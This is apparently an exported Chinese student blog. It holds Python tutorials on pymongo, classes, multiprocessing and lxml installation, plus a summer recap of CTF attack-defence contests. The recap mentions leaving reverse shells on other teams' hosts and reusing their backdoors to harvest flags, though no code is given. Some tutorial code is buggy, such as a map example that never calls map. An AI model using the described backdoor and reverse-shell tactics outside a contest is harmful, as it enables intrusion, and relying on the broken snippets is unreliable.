    # select * from users where name = &apos;user3&apos; and age &gt; 12 and age &lt; 15
     for u in db.users.find({&apos;age&apos;: {&apos;$gt&apos;: 12, &apos;$lt&apos;: 15}, &apos;name&apos;: &apos;user3&apos;}): print u
# select * from users where name = &apos;user1&apos; and age = 21
     for u in db.users.find({&quot;age&quot;:21, &quot;name&quot;:&quot;user1&quot;}): print u

    *记住，使用find（）函数时，对应的条件都是以字典的形式表示｛&apos;age&apos;:{&apos;$gt&apos;:12},&apos;xx&apos;:&apos;xx&apos;｝，有多个条件时，都放在一个{}内
（3）计数，用count()函数
    # select count(*) from users  查询users表中所有的记录的个数   
        print(db.users.find().count()) 
    # select count(*) from users where age &gt; 30 查询users表中age&gt;30的记录
        print(db.users.find({&quot;age&quot;:{&quot;$gt&quot;:30}}).count())
（4）从第几行开始读取(SLICE)，读取多少行(LIMIT) 
    #从第2行开始读取，读取3行记录
    for u in db.users.find().skip(2).limit(3): print u
</code></pre><h3 id="4-导入json格式数据到Mongodb中"><a href="#4-导入json格式数据到Mongodb中" class="headerlink" title="4 导入json格式数据到Mongodb中"></a>4 导入json格式数据到Mongodb中</h3><ol>
<li><p>首先运行 mongo shell在数据库中创建一个 collection —— db.createCollection(‘the_name’)</p>
</li>
<li><p>接下来直接在终端/命令行中使用命令导入 json 格式的数据 —— mongoimport -d database_name -c collection_name F:\sample.json</p>
</li>
</ol>
<p>以管理员权限用cd命令进入MongoDB安装目录中bin目录下，运行如下命令：<br>F:MongoDB&gt;bin&gt; mongoimport -d 数据库名字 -c 集合名字 –type 文件类型 –file 文件路径  –upsert<br>其中，–upsert字段的意思是以插入(insert)或者更新(update)的方式来导入数据</p>
<pre><code>F:\MongoDB\bin&gt;mongoimport -d ceshi -c item_infoX --type json --file F:\sample.json --upsert
    2016-10-06T14:55:27.643+0800    connected to: localhost
    2016-10-06T14:55:30.641+0800    [#####...................] ceshi.item_infoX     7.56MB/34.2MB (22.1%)
    2016-10-06T14:55:33.639+0800    [##########..............] ceshi.item_infoX     15.3MB/34.2MB (44.9%)
    2016-10-06T14:55:36.639+0800    [################........] ceshi.item_infoX     23.3MB/34.2MB (68.1%)
    2016-10-06T14:55:39.640+0800    [#####################...] ceshi.item_infoX     31.3MB/34.2MB (91.5%)
    2016-10-06T14:55:40.761+0800    [########################] ceshi.item_infoX     34.2MB/34.2MB (100.0%)
    2016-10-06T14:55:40.762+0800    imported 86850 documents
</code></pre><h3 id="5-未完待续"><a href="#5-未完待续" class="headerlink" title="5 未完待续"></a>5 未完待续</h3>]]></content>
      
        
        <tags>
            
            <tag> python3 数据库 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python类的学习]]></title>
      <url>http://yoursite.com/2016/10/05/python%E7%B1%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p><img src="http://p1.bpimg.com/567571/370befa1102c08bc.png" alt=""></p>
<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0 前言"></a>0 前言</h2><p>   正如”类”的名称一样，它描述的概念和我们现实生活中的类的概念很相似。生物有不同的种类，食物有不同的种类，人类社会有种种商品也有不同的种类。单反可被称之为一类的物体，他们都有着相似的特征和行为方式。</p>
<p>也就是说：</p>
<pre><code>类是有一些系列有共同特征和行为事物的抽象概念的综合
</code></pre><a id="more"></a>
<h2 id="1-类的属性，实例属性，方法，引用"><a href="#1-类的属性，实例属性，方法，引用" class="headerlink" title="1 类的属性，实例属性，方法，引用"></a>1 类的属性，实例属性，方法，引用</h2><pre><code>class CocaCola:
    #在类里面赋值的变量就是类的变量，类的变量有一个专业术语，称之为类的属性
    formula = [&quot;caffeine&quot;,&quot;sugar&quot;,&quot;water&quot;,&quot;soda&quot;]
    #方法就是函数，但我们把这个函数称之为方法。方法是供实例使用的，因此我们还可以称之为实例方法
    #被实例化的对象会被编辑器默默地传入后面的方法括号中，作为第一个参数
    &quot;&quot;&quot;
    #除了必写的self参数之外，__init__()同样可以有自己的参数，同时不需要这样obj.__init__()方法来调用（因为是自动执行）
    #在实例化的时候往类后面括号中放入参数，相应的所有参数都会传递到这个特殊的__init__()方法中，和函数的参数用法完全相同
    def __init__(self,logo_name):
        #左边的变量作为类的属性，右边是传入的这个参数作为变量，也就是说这个变量的赋值所储存的结果取决于初始化的时候所传进来的参数logo_name,传进来什么那么它就将是什么
        self.local_logo = logo_name
    def drink(self):
        print (&quot;Energy&quot;)
coke = CocaCola(&quot;可口可乐&quot;)
#coke.drink()
coke.local_logo
&quot;&quot;&quot;
    #和函数一样，类的方法也能有属于自己的函数，我们先试着在.drink()方法上做些改动
    def drink(self,how_much):
        if how_much == &quot;a sip&quot;:
            print(&quot;Cool~&quot;)
        elif how_much == &quot;whole bottle&quot;:
            print (&quot;Headache!&quot;)
ice_coke = CocaCola()
ice_coke.drink(&quot;a sip&quot;)

#类的实例化  按着我们定义好的配方来生产可乐，当然，按照这个配方无论生产多少瓶可乐它们的味道都是一样的
#在左边创建一个变量，右边写上类的名称，看起来很像是赋值的行为，我们称之为类的实例化，而被实例化的对象称之为实例。
coke_for_me = CocaCola()
coke_for_you = CocaCola()

coke_for_China = CocaCola()
#在创建了类之后，通过object.new_attr的形式进行创建一个赋值，于是我们就可以得到一个新的实例的变量，实例的变量称之为实例属性
coke_for_China.local_logo = &quot;可口可乐0&quot; #创建实例属性
print (coke_for_China.local_logo )  #打印实例属性引用结果
#在类的名字后面输入.,IDE就会自动联想出我们之前在定义类的时候写在里面的属性，而这就是类属性的引用
#类的属性会被所有的类的实例共享
print(CocaCola.formula)
print(coke_for_me.formula)
print(coke_for_you.formula)
for element in coke_for_me.formula:
    print(element)



&quot;&quot;&quot;
__init__()是initialize(初始化)的缩写，这也就意味着即使我们在创建实例的时候不去引用init_()方法，其中的命令也会先被自动的执行

&quot;&quot;&quot;
</code></pre><h2 id="2-令人困惑的类属性与实例属性"><a href="#2-令人困惑的类属性与实例属性" class="headerlink" title="2 令人困惑的类属性与实例属性"></a>2 令人困惑的类属性与实例属性</h2><p><img src="http://p1.bpimg.com/567571/768b9fe9a95a0f6a.png" alt=""></p>
<pre><code>&quot;&quot;&quot;
python中属性的引用机制是自外而内的，当创建一个实例之后，准备开始引用属性，这时编辑器会先搜索该实例是否用拥有该属性，有则引用
如果没有，将搜索这个实例所属的类是否有这个尚需经，如果有，则引用，没有就只能报错
&quot;&quot;&quot;

#类属性若被重新赋值，会影响到类属性的引用
class TestA:
    attr = 1
obj_a = TestA()

TestA.attr = 42
print(obj_a.attr)
#实例属性若被重新赋值，不会影响到类属性的引用
class TestB:
    attr =1
obj_a = TestA()
obj_b = TestB()

obj_a.attr = 42  #实例属性
print(obj_b.attr)
#类属性实例属性具有相同的名称，那么.后面引用将会发生什么?
class TestC:
    attr = 1
    def __init__(self):
        self.attr = 42
print(obj_b.attr)
print(TestC.__dict__)
print(obj_a.__dict__)
</code></pre><p>运行结果：</p>
<pre><code>C:\python35\python3.exe G:/untitled/LeiShuxing.py
42
1
1
{&apos;attr&apos;: 1, &apos;__dict__&apos;: &lt;attribute &apos;__dict__&apos; of &apos;TestC&apos; objects&gt;, &apos;__init__&apos;: &lt;function TestC.__init__ at 0x000001CBBA8DBAE8&gt;, &apos;__module__&apos;: &apos;__main__&apos;, &apos;__doc__&apos;: None, &apos;__weakref__&apos;: &lt;attribute &apos;__weakref__&apos; of &apos;TestC&apos; objects&gt;}
{&apos;attr&apos;: 42}
</code></pre><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>也许运行完上面三段代码，会有一些初步结论，但为更直接的解释，全部隐藏在类的特殊属性<strong>dict</strong>中。<strong>dict</strong>是一个类的特殊属性，它是一个字典，用于储存类或者实例的属性。即使你不去定义它，他也会存在每一个类中，是默认隐藏的。</p>
]]></content>
      
        
        <tags>
            
            <tag> python3 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[pool线程池的使用]]></title>
      <url>http://yoursite.com/2016/09/25/pool%E7%BA%BF%E7%A8%8B%E6%B1%A0%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      <content type="html"><![CDATA[<h3 id="1-线程池的原理和使用"><a href="#1-线程池的原理和使用" class="headerlink" title="1 线程池的原理和使用"></a>1 线程池的原理和使用</h3><p>问题的提出：</p>
<blockquote>
<p>在使用多线程的时候面对着一个问题，如果使用断点下载，把每个range设置为指定值，文件大或者range小都会面对一个任务数爆炸的状态。使用一个线程来完成一个任务会造成线程数过多，线程数过多不仅影响效率，也会影响程序的健壮性<br><a id="more"></a></p>
<h3 id="2-线程池的原理"><a href="#2-线程池的原理" class="headerlink" title="2 线程池的原理"></a>2 线程池的原理</h3><pre><code>1.线程池首先会维护一个任务队列
2.生成工作使用的线程(可以是自定义个数，也可以是系统默认)
3.线程分别从队列中取出任务，并执行，一个任务执行完成需要告诉主线程完成一个任务
4.再从任务队列中取出任务，直到所有任务为空，退出线程
</code></pre><h3 id="3-具体使用"><a href="#3-具体使用" class="headerlink" title="3 具体使用"></a>3 具体使用</h3><h5 id="A-新建单一进程"><a href="#A-新建单一进程" class="headerlink" title="A 新建单一进程"></a>A 新建单一进程</h5><pre><code>import multiprocessing
import time
</code></pre></blockquote>
<pre><code>def func(msg):
    print(msg)
    time.sleep(1)

if __name__ == &quot;__main__&quot;:
     #将函数作为第一个参数传入Process中，注意函数不能是类里面的函数，只能是独立定义的
       #把args参数作为第二个参数传入Process中，注意下面例子中的args=(&quot;hello &quot;, )是打包成了元组类型，可迭代，但是里面只有一个元素
    #func(&quot;Josn&quot;)
    p = multiprocessing.Process(target = func,args = (&quot;hello &quot;,))
    p.start()
    p.join()
    print(&quot;Done!&quot;)
</code></pre><h4 id="B-使用进程池"><a href="#B-使用进程池" class="headerlink" title="B 使用进程池"></a>B 使用进程池</h4><pre><code>import multiprocessing
import time

def func(msg):
    print(msg)
    time.sleep(1)
if __name__ == &quot;__main__&quot;:
    pool = multiprocessing.Pool()
    for item in range(3):
        msg = &quot;hello &quot; + str(item)
        pool.apply_async(func, (msg,))
    pool.close()
    pool.join()#用来等待进程池中的worker进程完毕，防止主进程在worker进程结束前结束，但pool.join()必须在pool.close()之后
    print(&quot;Done!&quot;)
</code></pre><p>使用  pool.apply_async（）的道理和pool.map()一样，注意的是第二个参数一定是可以迭代的，即函数一个个传进去对应着前面的函数，利用pool.map()创建工程如下</p>
<h4 id="C-利用map函数修改"><a href="#C-利用map函数修改" class="headerlink" title="C 利用map函数修改"></a>C 利用map函数修改</h4><pre><code>import multiprocessing
import time

def func(msg)
    print(msg)
    time.sleep(2)
if __name__ == &quot;__main__&quot;:
    pool = multiprocessing.Pool()
    msg_list = []
    for item in range(4):
        msg_list.append(&quot;hello &quot; + str(item))
    pool.close()
    pool.join()
    print(&quot;Done!&quot;)
</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>学会利用pycharm的debug功能下断点，充分领会代码的运行机制<br><img src="http://p1.bpimg.com/567571/eacff7552370ad72.png" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> python3 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python3安装lxml技巧]]></title>
      <url>http://yoursite.com/2016/09/24/python3%E5%AE%89%E8%A3%85lxml%E6%8A%80%E5%B7%A7/</url>
      <content type="html"><![CDATA[<h3 id="抛出问题"><a href="#抛出问题" class="headerlink" title="抛出问题"></a>抛出问题</h3><p>python3 安装第三方库报错 Unable to find vcvarsall.bat</p>
<p>出现如下错误：<br><img src="http://p1.bqimg.com/567571/e4744ccca8298538.jpg" alt=""><br>python的部分库在安装时要临时编译，找不到编辑器就会报错，类似的库还有numpy等。根据提示装了Visual C++ 10.0仍然报错。微软网站只找到Python2.7用的VC编辑器（我用的Python3.5)，经过一番挣扎搜索终于解决。<br><a id="more"></a></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>lxml是Python语言里和XML以及HTML工作的功能最丰富和最容易使用的库。lxml库的安装和python其他第三方库的安装方法是一样的，但是可能由于一些细节上的失误导致安装失败。我在利用BeautifulSoup模块时，用pip3安装lxml时，各种的报错，但功夫不负有心人，最终利用下面的技巧解决了安装lxml失败问题</p>
<h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><h5 id="1-在系统环境变量中指定pip3-exe的路径"><a href="#1-在系统环境变量中指定pip3-exe的路径" class="headerlink" title="1.在系统环境变量中指定pip3.exe的路径"></a>1.在系统环境变量中指定pip3.exe的路径</h5><p><img src="http://i1.piimg.com/567571/f4f158fb27e2f605.png" alt=""></p>
<h5 id="2-安装wheel-Python扩展包pygame地址-http-www-lfd-uci-edu-gohlke-pythonlibs-pygame"><a href="#2-安装wheel-Python扩展包pygame地址-http-www-lfd-uci-edu-gohlke-pythonlibs-pygame" class="headerlink" title="2.安装wheel,Python扩展包pygame地址 http://www.lfd.uci.edu/~gohlke/pythonlibs/#pygame"></a>2.安装wheel,<a href="http://www.lfd.uci.edu/~gohlke/pythonlibs/#pygame" target="_blank" rel="external">Python扩展包pygame地址</a> <a href="http://www.lfd.uci.edu/~gohlke/pythonlibs/#pygame" target="_blank" rel="external">http://www.lfd.uci.edu/~gohlke/pythonlibs/#pygame</a></h5><h5 id="3-点击-pygame-1-9-2b1-cp35-cp35m-win-amd64-whl"><a href="#3-点击-pygame-1-9-2b1-cp35-cp35m-win-amd64-whl" class="headerlink" title="3.点击 pygame-1.9.2b1-cp35-cp35m-win_amd64.whl"></a>3.点击 pygame-1.9.2b1-cp35-cp35m-win_amd64.whl</h5><p><img src="http://i1.piimg.com/567571/94c13029e1764c81.png" alt=""></p>
<h5 id="4-保存本地文件，文件名结构是很重要的，不要重命名文件。"><a href="#4-保存本地文件，文件名结构是很重要的，不要重命名文件。" class="headerlink" title="4.保存本地文件，文件名结构是很重要的，不要重命名文件。"></a>4.保存本地文件，文件名结构是很重要的，不要重命名文件。</h5><h5 id="5-wheel（-whl）文件使用PIP3安装。因此，在安装-whl文件之前，需要确保pip3是最新版本。"><a href="#5-wheel（-whl）文件使用PIP3安装。因此，在安装-whl文件之前，需要确保pip3是最新版本。" class="headerlink" title="5.wheel（.whl）文件使用PIP3安装。因此，在安装.whl文件之前，需要确保pip3是最新版本。"></a>5.wheel（.whl）文件使用PIP3安装。因此，在安装.whl文件之前，需要确保pip3是最新版本。</h5><p>A . pip3是用来解压缩.whl文件的。输入python3 -m ensurepip</p>
<p><img src="http://i1.piimg.com/567571/0aedd70e6ec52d23.png" alt=""></p>
<p>B . 如果告知Requirement already satisfied，运行升级命令“python –m ensurepip –upgrade”</p>
<p>C . 安装 wheel. 在命令提示行输入 “pip3 install wheel”:<br><img src="http://i1.piimg.com/567571/eb949630d9de197c.png" alt=""></p>
<p>D . 如果告知Requirement already satisfied，运行升级命令 “pip install wheel –upgrade”</p>
<p>E . 现在可以安装pygame-1.9.2b1-cp35-cp35m-win_amd64.whl，确保在保存的文件目录下执行命令，命令行输入“pip install pygame-1.9.2b1-cp35-cp35m-win_amd64.whl”</p>
<p>F . “pip3 install lxml”</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这是我知道安装lxml用到的最切实可行的方法，但每个人遇到的问题不尽相同，利用好谷叔叔，还有在利用pip安装遇到问题，利用好日志文件pip.log中发现问题，定位好问题，搜索然后顺利解答。</p>
]]></content>
      
        
        <tags>
            
            <tag> python3 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[关于python引入模块问题]]></title>
      <url>http://yoursite.com/2016/09/24/%E5%85%B3%E4%BA%8Epython%E5%BC%95%E5%85%A5%E6%A8%A1%E5%9D%97%E9%97%AE%E9%A2%98/</url>
      <content type="html"><![CDATA[<h3 id="1-问题由来"><a href="#1-问题由来" class="headerlink" title="1. 问题由来"></a>1. 问题由来</h3><p>关于import和from import使用一直存在疑惑，这几天写爬虫，调用其他的文件，才知道接口可以利用from import实现，具体问题是这样的:<br><a id="more"></a></p>
<pre><code>from datetime import datetime

print(datetime.now()) 
</code></pre><p>就可以执行，但是用import就不行：</p>
<pre><code>import datetime

print(datetime.now())
</code></pre><p>报错：AttributeError: module ‘datetime’ has no attribute ‘now’</p>
<pre><code>import datetime.datetime 
print(datetime.now())
</code></pre><p>报错：ImportError: No module named ‘datetime.datetime’; ‘datetime’ is not a package<br><!--more--></p>
<h3 id="2-具体解释"><a href="#2-具体解释" class="headerlink" title="2. 具体解释"></a>2. 具体解释</h3><p>Python标准库中有些东西容易糊弄住我们这些刚刚接触python新手，比如你说的datetime模块，datetime模块中有一个与datetime.py文件同名的类 <datetime>，now是它的一个静态方法，可以不用生成实例直接以Class.method()的方式调用。</datetime></p>
<pre><code>from module import Something
</code></pre><p>module是一个模块，说白了是一个文件，比如 datetime.py文件。<br>Something是模块的一个具体对象，可以是函数，可以是变量，可以是类。这点接口问题说的很直白。<br><!--more--></p>
<h3 id="3-注意"><a href="#3-注意" class="headerlink" title="3. 注意"></a>3. 注意</h3><p>一般情况下尽量使用import a，此时访问B时，可以通过a.B的形式。</p>
<p>有节制的使用from a import B，这样可以直接使用B。</p>
<p>避免使用from a import *，这种方法会污染命名空间，而且不能直观的显示导入哪些对象</p>
<h3 id="4-知乎完美回答"><a href="#4-知乎完美回答" class="headerlink" title="4. 知乎完美回答"></a>4. 知乎完美回答</h3><p>说的清晰明了，233333</p>
<blockquote>
<p>你有一个工具箱，箱子里有剪刀，有钳子，有螺丝刀等等。<br>现在你想拧螺丝。然后你一个操作是：从 工具箱 里拿 螺丝刀，然后用 螺丝刀 去拧螺丝 （ from import）。别一个操作是： 拿了 工具箱 ，没打开呢，直接就去 拧螺丝 ( import )。</p>
</blockquote>
]]></content>
      
        
        <tags>
            
            <tag> python3 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[暑假总结]]></title>
      <url>http://yoursite.com/2016/09/03/%E6%9A%91%E5%81%87%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>时光匆匆，匆匆时光，转眼间两个月的暑假就结束了， 回忆暑假有太多需要留念的，又要开始崭新的一学期，崭新的的大三生活，有收获同时也有遗憾，有不足，拼搏是唯一的选择，希望在即将逝去的时光中，一个个小目标都可以实现，进而自己的能力提升。</p>
 <a id="more"></a>
<p><strong>1.</strong><br>暑假刚刚开始的时候，去焦作参加了iscc2016河南赛区的线下赛，这也是继安恒杯参加的第二次线下赛，比赛中收获了一些经验，但发现了自己很多的不足，需要加强学习的地方太多</p>
<blockquote>
<p>day-1</p>
</blockquote>
<p>第一天的比赛形式就是线上夺旗赛+选择，选择题就是对自己学习的知识点总结，包括网站安全，路由器配置，linux，病毒等等，如果没有毕<br>师父在助攻，我也不敢说我最后能拿积分多少，自己几斤几两也就清楚了，线上解题拿flag自己暴漏的问题更多，同时也是平时做题的时候出现遗留的问题，稳不住，不能够专注解答一道题，进而不能稳住思路，现在慢慢感觉到解题能力和利用google搜索能力相挂钩，同时对代码的敏捷力，套路的不说，对“静”的学问学习的地方还有很多，只有静稳了，相信自己进步空间还有很多.</p>
<blockquote>
<p>day-2</p>
</blockquote>
<p>  结束的第一天晚上，学长们也分享了很多实用的脚本，及使用策略。第二天一开始的时候，也有平台的原因，也有我自己的原因，上来要映射端口，简直日了哈士奇，在浪费了计时流量的情况下，一个多小时竟浪费问题也没有解决掉，那叫一个悲催呀，完全不按前晚预想的套路出牌呀，大约十多才慢慢步入正道，紧接着cherkfile的脚本，造成自己本机文件狂删，黑客？？？只有自己心里清楚，紧接着批量获取flag的时候，策略不行，致使很多的flag失效，在给其他主机留反弹shell时，有的没有访问造成前面的功夫都是无用功，唯一欣慰的时候，最后利用别人的后门，然后利用3.php获取到他人的后门密码，那真叫收割flag收割的手疼。但是在攻击获取靶机的时候，什么中间件啥的完全就是模糊呀，真正的漏洞不会几个，这也是以后在学习实践中努力去培养的。</p>
<p><strong>2.</strong></p>
<p>结束回校没几天，家里有事情回家了一段时间，庆幸和姐，姐夫去青岛耍啦两天，贼开心。第二件大事就是去西安参加了赛客夏令营。在这里收获的不仅仅是知识，是一群志同道合比自己优秀的小伙伴，讲真，跟着老师学的不多，倒是跟着身边比较好的小伙伴学到了很多，不管在安全还是编程方面。期间web讲授的主要是对拿站的敏感点，以及套路，再就是利用sqli搭建的平台对宽字节等等的学习，这也在我回家后的一段时间，尽心的总结了一下，相信也是留给小学弟的干货啦，期间我也自学了总结了很多，比如说ctf技巧，对于ctf常见的弱类型的总结，文件上传，协议的总结性学习，有文档，慢慢都会上传到博客上面，最后一天的CTF比赛，也收获了一些比赛的经验</p>
<p><strong>3.</strong></p>
<p>博客搭建，也废了半天的时间，总体还好有同学的助攻</p>
<p><strong>4.</strong></p>
<p>简言之，知道现在有压力啦，这个暑假也是真正得去学学问啦，废话不多说，在大三关键一年，先定一个小目标，让自己的能力有一个质的跨越，自己的web python编程能力有一个飞跃跨度</p>
]]></content>
      
        
        <tags>
            
            <tag> 总结感想 </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
